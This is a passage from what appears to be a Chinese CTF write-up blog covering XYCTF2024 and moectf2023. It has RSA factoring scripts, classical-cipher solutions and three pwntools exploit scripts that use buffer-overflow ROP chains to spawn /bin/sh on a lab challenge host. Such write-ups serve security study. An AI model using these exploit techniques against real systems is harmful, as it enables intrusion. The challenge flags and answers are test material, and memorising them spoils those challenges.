newq = sorted([newp_, newq_])<br>                    if check_cong(k, newp, newq, n, p_xor_q):<br>                        newset.add((newp, newq))<br><br>        tracked = newset<br>        if len(tracked) &gt; maxtracked:<br>            maxtracked = len(tracked)<br>    print('Tracked set size: {} (max={})'.format(len(tracked), maxtracked))<br><br>    <span class="hljs-meta"># go through the tracked set and pick the correct (p, q)</span><br>    for p, q in tracked:<br>        if p != <span class="hljs-number">1</span> and p*q == n:<br>            return p, q<br><br>    assert False, 'factors were not in tracked set. Is your p^q correct?'<br><br>p, q = factor(n, gift)<br>print(p)<br>print(q)<br>'''<br>p=<span class="hljs-number">14580549955135</span><span class="hljs-number">18375451706708</span><span class="hljs-number">39798336872366</span><span class="hljs-number">41438331104201</span><span class="hljs-number">83863865952880</span><span class="hljs-number">60139791135454</span><span class="hljs-number">98041301469392</span><span class="hljs-number">48669539726622</span><span class="hljs-number">66748526407954</span><span class="hljs-number">49287761042960</span><span class="hljs-number">28862443729240</span><span class="hljs-number">35960962307198</span><span class="hljs-number">91065947563933</span><span class="hljs-number">39458959227173</span><span class="hljs-number">07291255423855</span><span class="hljs-number">61627492458427</span><span class="hljs-number">05701261800503</span><span class="hljs-number">63106535962473</span><span class="hljs-number">04910757655631</span><span class="hljs-number">54610137558590</span><span class="hljs-number">97114552522187</span><span class="hljs-number">75517142362107</span>1<br>q=<span class="hljs-number">15379694704827</span><span class="hljs-number">04295104447564</span><span class="hljs-number">58855481287460</span><span class="hljs-number">63946856300121</span><span class="hljs-number">34899076251324</span><span class="hljs-number">38953570738468</span><span class="hljs-number">18177092509186</span><span class="hljs-number">74397275190746</span><span class="hljs-number">85449940618659</span><span class="hljs-number">58311433850187</span><span class="hljs-number">26982207454735</span><span class="hljs-number">31199063071421</span><span class="hljs-number">85252161880576</span><span class="hljs-number">56279991061880</span><span class="hljs-number">15431567625318</span><span class="hljs-number">85089989505213</span><span class="hljs-number">01570378229609</span><span class="hljs-number">45909520973243</span><span class="hljs-number">79350774081743</span><span class="hljs-number">67075045057091</span><span class="hljs-number">94025074527084</span><span class="hljs-number">80305410760554</span>7<br>'''<br>e = <span class="hljs-number">65537</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = invert(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>print(long_to_bytes(m))<br><span class="hljs-meta">#password{pruning_algorithm}</span><br></code></pre></td></tr></table></figure><img src="/2024/04/29/XYCTF2024WP/image-20240407213102631.png" class title="image-20240407213102631"><img src="/2024/04/29/XYCTF2024WP/image-20240407212856962.png" class title="image-20240407212856962"><img src="/2024/04/29/XYCTF2024WP/image-20240407212928896.png" class title="image-20240407212928896"><h4 id="第9层：渡劫"><a href="#第9层：渡劫" class="headerlink" title="第9层：渡劫"></a>第9层：渡劫</h4><p>hint9.py</p><p>  exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros">n = 107803636687595025440095910573280948384697923215825513033516157995095253288310988256293799364485832711216571624134612864784507225218094554935994320702026646158448403364145094359869184307003058983513345331145072159626461394056174457238947423145341933245269070758238088257304595154590196901297344034819899810707<br>c = 46049806990305232971805282370284531486321903483742293808967054648259532257631501152897799977808185874856877556594402112019213760718833619399554484154753952558768344177069029855164888168964855258336393700323750075374097545884636097653040887100646089615759824303775925046536172147174890161732423364823557122495<br>list = [618066045261118017236724048165995810304806699407382457834629201971935031874166645665428046346008581253113148818423751222038794950891638828062215121477677796219952174556774639587782398862778383552199558783726207179240239699423569318, 837886528803727830369459274997823880355524566513794765789322773791217165398250857696201246137309238047085760918029291423500746473773732826702098327609006678602561582473375349618889789179195207461163372699768855398243724052333950197]<br><br><br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><br><span class="hljs-keyword">for</span> a1 <span class="hljs-keyword">in</span> range(256):<br>    <span class="hljs-keyword">for</span> a2 <span class="hljs-keyword">in</span> range(256):<br>        <span class="hljs-attribute">p</span>=gcd(list[0]<span class="hljs-number">*a1</span>-list[1]<span class="hljs-number">*a2</span>,n)<br>        <span class="hljs-keyword">if</span> n%<span class="hljs-attribute">p</span>==0 <span class="hljs-keyword">and</span> p!=1 <span class="hljs-keyword">and</span> p!=n:<br>            <span class="hljs-built_in">print</span>(list[0] * a1 - list[1] * a2 % n)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">'p='</span>,p)<br><br><br><span class="hljs-attribute">p</span>=12951283811821084332224320465045864899191924765916891677355364529850728204537369439910942929239876470054661306841056350863576815710640615409980095344446711<br><br><span class="hljs-attribute">q</span>=n//p<br><span class="hljs-built_in">print</span>(q,<span class="hljs-attribute">n</span>==p*q)<br><span class="hljs-attribute">e</span>=65537<br><span class="hljs-built_in">print</span>(gcd(e,(p-1)))<br><span class="hljs-attribute">d</span>=invert(e,(p-1))<br><span class="hljs-built_in">print</span>(d)<br><br><span class="hljs-attribute">m</span>=powmod(c%p,d,p)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b'game_over'</span><br></code></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="hello-world-签到"><a href="#hello-world-签到" class="headerlink" title="hello_world(签到)"></a>hello_world(签到)</h3><p>exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>context(<span class="hljs-attribute">arch</span>=<span class="hljs-string">'amd64'</span>,os='linux',log_level='debug')<br>p = remote(<span class="hljs-string">'192.168.182.1'</span>,13830)<br><br>elf = ELF(<span class="hljs-string">"./vuln"</span>)<br>libc = ELF(<span class="hljs-string">"./libc.so.6"</span>)<br><br><span class="hljs-attribute">payload</span>=b'a'*0x28<br>p.send(payload)<br><span class="hljs-attribute">base</span>=u64(p.recvuntil("\x7f")[-6:].ljust(8,b<span class="hljs-string">"\x00"</span>))-0x29d90<br><span class="hljs-attribute">pop_rdi</span>=0x2a3e5+base<br><span class="hljs-attribute">system</span>=base+libc.sym[<span class="hljs-string">'system'</span>]<br><span class="hljs-attribute">binsh</span>=base+0x1d8678<br><span class="hljs-attribute">ret</span>=base+0x2db7d<br><span class="hljs-attribute">payload</span>=b'a'*0x28+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br><br>p.sendlineafter(b<span class="hljs-string">'please input your name:'</span>,payload)<br>p.interactive()<br>XYCTF{a954b733-9403-42ee-b59f-ff006a2eac03}<br></code></pre></td></tr></table></figure><h3 id="static-link"><a href="#static-link" class="headerlink" title="static_link"></a>static_link</h3><p>exp</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs erlang">from pwn import *<br><span class="hljs-function"><span class="hljs-title">context</span><span class="hljs-params">(arch='amd64',os='linux',log_level='debug')</span></span><br><span class="hljs-function"><span class="hljs-title">p</span> = <span class="hljs-title">remote</span><span class="hljs-params">('<span class="hljs-number">192.168</span>.<span class="hljs-number">182.1</span>',<span class="hljs-number">14286</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">pop_rdi</span> = 0<span class="hljs-title">x401f1f</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">pop_rsi</span> = 0<span class="hljs-title">x409f8e</span> </span><br><span class="hljs-function"><span class="hljs-title">pop_rdx</span> = 0<span class="hljs-title">x451322</span> </span><br><span class="hljs-function"><span class="hljs-title">pop_rax</span> = 0<span class="hljs-title">x447fe7</span> </span><br><span class="hljs-function"><span class="hljs-title">ret_addr</span> = 0<span class="hljs-title">x40101a</span> </span><br><span class="hljs-function"><span class="hljs-title">syscall_addr</span> = 0<span class="hljs-title">x447590</span> </span><br><span class="hljs-function"><span class="hljs-title">binsh_addr</span> = 0<span class="hljs-title">x4C5240</span> </span><br><span class="hljs-function"><span class="hljs-title">read_addr</span> = 0<span class="hljs-title">x447580</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">payload1</span> = <span class="hljs-title">b'a'</span>* 0<span class="hljs-title">x28</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span> +<span class="hljs-title">p64</span><span class="hljs-params">(pop_rsi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(binsh_addr)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdx)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">256</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(read_addr)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rax)</span>+ <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">59</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(binsh_addr )</span>+<span class="hljs-title">p64</span><span class="hljs-params">(pop_rsi)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(pop_rdx)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span> + <span class="hljs-title">p64</span><span class="hljs-params">(syscall_addr)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">send</span><span class="hljs-params">(payload1)</span> </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">send</span><span class="hljs-params">('/bin/sh')</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">p</span>.<span class="hljs-title">interactive</span><span class="hljs-params">()</span> </span><br></code></pre></td></tr></table></figure><h3 id="guestbook1"><a href="#guestbook1" class="headerlink" title="guestbook1"></a>guestbook1</h3><p>exp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">context</span>(arch='amd64',os='linux',log_level='debug')<br><br><br><span class="hljs-attribute">p</span> = remote('<span class="hljs-number">192.168.182.1</span>',<span class="hljs-number">12571</span>)<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"index\n"</span>,b'<span class="hljs-number">32</span>')<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"name:\n"</span>, b'<span class="hljs-number">111</span>')<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"id:\n"</span>, b'<span class="hljs-number">0</span>')<br><span class="hljs-attribute">ret_addr</span>=<span class="hljs-number">0</span>x40101A<br><span class="hljs-attribute">backdoor</span>=<span class="hljs-number">0</span>x40133A<br><span class="hljs-attribute">ls</span>=[<span class="hljs-number">58</span>,<span class="hljs-number">19</span>,<span class="hljs-number">64</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"index\n"</span>, b'%d'%i)<br><span class="hljs-attribute">p</span>.sendafter(b<span class="hljs-string">"name:\n"</span>, p64(backdoor)*<span class="hljs-number">2</span>)<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"id:\n"</span>, b'%d'%ls[i%<span class="hljs-number">8</span>])<br><span class="hljs-attribute">p</span>.sendlineafter(b<span class="hljs-string">"index\n"</span>, b'-<span class="hljs-number">1</span>')<br><span class="hljs-attribute">p</span>.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto Misc pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2023</title>
    <link href="/2024/04/29/moectf2023/"/>
    <url>/2024/04/29/moectf2023/</url>
    
    <content type="html"><![CDATA[<p>wp是去年写的，记录了当时做出来的题，打算把去年题复现一遍，先把去年的wp修修发出来，其他的题慢慢再更新把</p><h1 id="Classical-crypto"><a href="#Classical-crypto" class="headerlink" title="Classical crypto"></a><strong>Classical crypto</strong></h1><h3 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a><strong>ezrot</strong></h3><p>密文：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;<span class="hljs-variable">@64E</span>7LC<span class="hljs-variable">@Ecf0</span><span class="hljs-symbol">:D0</span>;<span class="hljs-variable constant_">FDE020D</span><span class="hljs-symbol">:&gt;</span>!=<span class="hljs-number">60</span>=6<span class="hljs-symbol">EE6C0DF3DE:</span><span class="hljs-variable constant_">EFE</span><span class="hljs-symbol">:</span>@<span class="hljs-string">?0</span>4<span class="hljs-symbol">:</span>!96C0tsAJdEA6d;F&#125;%0N<br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;rot47_is_just_<span class="hljs-built_in">a_simPle</span>_letter_substitution_ciPher_EDpy5tpe5juNT_&#125;<br></code></pre></td></tr></table></figure><p>根据题目描述，应当是rot密码，出现@！等符号，所以是rot47，用cyberchef解得flag</p><img src="/2024/04/29/moectf2023/clip_image002.png" class title="img"><h3 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a><strong>可可的新围墙</strong></h3><p>密文：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">mt<span class="hljs-number">3</span>_hsTal<span class="hljs-number">3</span>yG<span class="hljs-symbol">nM_p3</span>jocfF<span class="hljs-symbol">n3</span>cp<span class="hljs-number">3</span>_hFs<span class="hljs-number">3</span>c_<span class="hljs-number">3</span>TrB__i<span class="hljs-number">3</span>_uBro_lcsOp&#125;e&#123;ciri_hT_av<span class="hljs-symbol">n3</span>Fa_j<br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">moectf&#123;F<span class="hljs-number">3</span><span class="hljs-symbol">nc3</span>_ciph<span class="hljs-number">3</span>r_shiFTs_<span class="hljs-number">3</span>ach_l<span class="hljs-number">3</span>TT<span class="hljs-number">3</span>r_By_a_Giv<span class="hljs-number">3</span><span class="hljs-symbol">n_nuMB3</span>r_oF_plac<span class="hljs-number">3</span>s_Ojpj&#125;<br></code></pre></td></tr></table></figure><p>​     根据密文特征（“{}”位置）猜测是栅栏密码，枚举未得到flag，再仔细观察，发现密文中m和e只出现过1次，即加密方式类似如下：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">mt<span class="hljs-number">3</span>_hsTal<span class="hljs-number">3</span>yG<span class="hljs-symbol">nM_p3</span>j<br>ocfF<span class="hljs-symbol">n3</span>cp<span class="hljs-number">3</span>_hFs<span class="hljs-number">3</span>c_<span class="hljs-number">3</span>TrB__i<span class="hljs-number">3</span>_uBro_lcsOp&#125;<br>e&#123;ciri_hT_av<span class="hljs-symbol">n3</span>Fa_j<br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">mt<span class="hljs-number">3</span>_hsTal<span class="hljs-number">3</span>yG<span class="hljs-symbol">nM_p3</span>jocfF<span class="hljs-symbol">n3</span>cp<span class="hljs-number">3</span>_hFs<span class="hljs-number">3</span>c_<span class="hljs-number">3</span>TrB__i<span class="hljs-number">3</span>_uBr<br>o_lcsOp&#125;<br>e&#123;ciri_hT_av<span class="hljs-symbol">n3</span>Fa_j<br></code></pre></td></tr></table></figure><p>猜测是w型栅栏，用脚本解得flag</p><img src="/2024/04/29/moectf2023/clip_image004.png" class title="img"><h3 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a><strong>皇帝的新密码</strong></h3><p>密文：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">tvljam</span><span class="hljs-template-variable">&#123;JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av&#125;</span><br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;CaEsaE_CIphEr_Is_<span class="hljs-built_in">a_vErY</span>_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;<br></code></pre></td></tr></table></figure><p>​     密文显示flag形式的字符串，且开头tvljam与moectf偏移量均为7，猜测是凯撒密码，解得</p><img src="/2024/04/29/moectf2023/clip_image006.png" class title="img"><h3 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a><strong>不是“皇帝的新密码”</strong></h3><p>密文：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">scsfct</span><span class="hljs-template-variable">&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;</span><br></code></pre></td></tr></table></figure><p>md5 of flag (utf-8) </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ea23f80270bdd96b5fcd213cae68eea5<br></code></pre></td></tr></table></figure><p>flag：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;vIgENErE_CIphEr_Is_<span class="hljs-built_in">a_lIttlE</span>_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz&#125;<br></code></pre></td></tr></table></figure><p>​     根据密文，开头字母与moectf偏移量并不呈规律变化，不是凯撒密码，根据古典密码的特征，最有可能的是Vigenere，但我们并不会知道密钥，用moectf做密钥解密得</p><img src="/2024/04/29/moectf2023/clip_image008.png" class title="img"><p>发现密钥为goodjo，解得</p><img src="/2024/04/29/moectf2023/clip_image010.png" class title="img"><p>提交flag并不正确，再仔细观察信息，发现提示flag的md5值，将刚刚得到的flag计算md5</p><img src="/2024/04/29/moectf2023/clip_image012.png" class title="img"><p>发现刚刚得到的并不是flag，说明密钥不对，仔细观察，密钥出现good单词，剩下的jo极有可能是job，因此猜测密钥是goodjob，再进行·解密</p><img src="/2024/04/29/moectf2023/clip_image014.png" class title="img"><p>并计算md5</p><img src="/2024/04/29/moectf2023/clip_image016.png" class title="img"><p>发现值与题所给md5相同，得到正确flag</p><p>猫言喵语:</p><p>密文;</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">喵喵？ 喵喵喵喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵？喵喵？ 喵喵喵喵喵？ 喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？ 喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵？喵喵喵 喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵喵喵？喵喵喵喵喵喵 喵喵喵 喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵？喵喵喵 喵喵？喵喵？喵喵？ 喵喵喵喵喵喵喵喵？ 喵喵？喵喵？喵喵喵喵喵喵 喵喵喵喵喵喵 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵？喵喵喵喵喵喵喵喵喵 喵喵？喵喵喵喵喵？喵喵？ 喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？ 喵喵喵喵喵？喵喵喵 喵喵？喵喵喵喵喵喵喵喵？<br></code></pre></td></tr></table></figure><p>Flag:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX&#125;</span><br></code></pre></td></tr></table></figure><p>​     最开始猜测是兽语解密，但尝试了一番，并没有得到flag，同时注意到题目hint：morse code，告诉我们是摩斯密码，故将文本尝试转换成morse code，解得</p><img src="/2024/04/29/moectf2023/clip_image018.png" class title="img"><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h3 id="Crypto-入门指北"><a href="#Crypto-入门指北" class="headerlink" title="Crypto 入门指北"></a><strong>Crypto</strong> <strong>入门指北</strong></h3><p>​    运行脚本得flag</p><p>flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!&#125;<br></code></pre></td></tr></table></figure><h3 id="baby-e"><a href="#baby-e" class="headerlink" title="baby_e"></a><strong>baby_e</strong></h3><p>​     e很小，可以采用低加密指数攻击</p><img src="/2024/04/29/moectf2023/clip_image020.png" class title="img"><p>编写脚本得</p><p>Flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;SMaLL_3xPon3nt_Mak3_rSa_w3ak!_!lP0iYlJf!M3rux9G9Vf!JoxiMl903lllA&#125;<br></code></pre></td></tr></table></figure><h3 id="bad-E"><a href="#bad-E" class="headerlink" title="bad_E"></a><strong>bad_E</strong></h3><p>非预期脚本：(当时初学Crypto，不知道从那个师傅哪里看到了nthroot_mod这个有限域开方函数，发现还挺好用，一路套脚本😀)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> sympy.ntheory.residue_ntheory import nthroot_mod<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br>e = 65537<br><span class="hljs-attribute">p</span>=6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571<br><span class="hljs-attribute">q</span>=11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819<br><span class="hljs-attribute">c</span>=63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805<br><span class="hljs-attribute">n</span>=p*q<br><span class="hljs-built_in">print</span>(long_to_bytes(nthroot_mod(c,e,p))<br></code></pre></td></tr></table></figure><p>预期解：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">e = 65537<br><span class="hljs-attribute">p</span>=6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571<br><span class="hljs-attribute">q</span>=11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819<br><span class="hljs-attribute">c</span>=63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805<br><span class="hljs-attribute">n</span>=p*q<br><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-keyword">from</span> gmpy2 import *<br><span class="hljs-built_in">print</span>(gcd(e,p-1))   #e|(p-1), gcd(e,q-1)=1<br><span class="hljs-attribute">d</span>=invert(e,(q-1))<br><span class="hljs-attribute">m</span>=powmod(c,d,q)<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>Flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;N0w_Y0U_hAve_kN0w_h0w_rsA_w0rks!_f!lP0iYlJf!M3ru&#125;<br></code></pre></td></tr></table></figure><h3 id="xorrrrrrrrr"><a href="#xorrrrrrrrr" class="headerlink" title="xorrrrrrrrr"></a><strong>xorrrrrrrrr</strong></h3><p>​     先拿moectf{去和密文xor，根据密文翻译出来的明文猜测明文后面的单词，再与该段密文xor得到部分flag，重复操作，最终得到完整flag</p><p>Flag：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">moectf&#123;W0W_y0U_HaVe_mastered_tHe_x0r_0Peart0r!_0iYlJf!M3rux9G9Vf!JoxiMl&#125;<br></code></pre></td></tr></table></figure><p><strong>factor_signin</strong></p><p>​    观察代码可知flag为rsa加密，前半部分的n1=p <em> q，后半部分n2=p1 </em> p2 * p3…p32,编写脚本得到两段flag，组合起来</p><p>脚本: </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">from</span> gmpy2 import *<br><br><br><span class="hljs-attribute">p</span>=<span 